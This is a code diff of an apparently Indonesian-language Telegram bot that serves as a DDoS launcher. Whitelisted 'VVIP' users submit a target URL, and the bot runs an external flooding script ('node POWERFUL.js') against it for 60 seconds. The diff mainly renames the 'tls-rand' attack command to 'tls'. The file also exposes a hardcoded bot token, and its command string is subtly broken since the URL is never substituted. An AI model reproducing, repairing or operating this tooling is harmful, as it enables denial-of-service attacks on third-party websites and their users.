@@ -8,8 +8,8 @@ bot = telebot.TeleBot('6388514873:AAFkOzS34BRXKJAs7T2RT0tfVjwwJAvlIb0')
 # Daftar pengguna VVIP
 vvip_users = []
 
-# Variabel status serangan tls-rand
-is_tls-rand_running = False
+# Variabel status serangan tls
+is_tls_running = False
 is_freeflood_running = False    
 
 # Menangani perintah /addvip
@@ -23,30 +23,30 @@ def handle_addvip(message):
     else:
         bot.reply_to(message, "Anda tidak memiliki izin untuk menambahkan pengguna VVIP.")
 
-# Menangani perintah /tls-rand
-@bot.message_handler(commands=['tls-rand'])
-def handle_tls-rand(message):
+# Menangani perintah /tls
+@bot.message_handler(commands=['tls'])
+def handle_tls(message):
     # Verifikasi pengguna VVIP
     if message.from_user.id in vvip_users:
-        global is_tls-rand_running
-        if not is_tls-rand_running:
+        global is_tls_running
+        if not is_tls_running:
             msg = bot.send_message(message.chat.id, "Masukkan target:")
-            bot.register_next_step_handler(msg, perform_tls-rand)
+            bot.register_next_step_handler(msg, perform_tls)
         else:
-            bot.reply_to(message, "Serangan tls-rand sedang berjalan.")
+            bot.reply_to(message, "Serangan tls sedang berjalan.")
     else:
         bot.reply_to(message, "Anda tidak memiliki izin untuk menggunakan fitur ini.")
 
-# Menjalankan serangan tls-rand
-def perform_tls-rand(message):
-    global is_tls-rand_running
+# Menjalankan serangan tls
+def perform_tls(message):
+    global is_tls_running
     url = message.text
     bot.send_message(message.chat.id, "Serangan dimulai")
-    is_tls-rand_running = True
+    is_tls_running = True
     os.system("node POWERFUL.js {url} 60 95500 ssl.txt")
     time.sleep(60)  # Tunggu selama 60 detik
-    is_tls-rand_running = False
-    bot.send_message(message.chat.id, "Serangan telah dihentikan.")
+    is_tls_running = False
+    bot.send_message(message.chat.id, "Serangan tls telah dihentikan.")
 
 @bot.message_handler(commands=['freeflood'])
 def handle_freeflood(message):
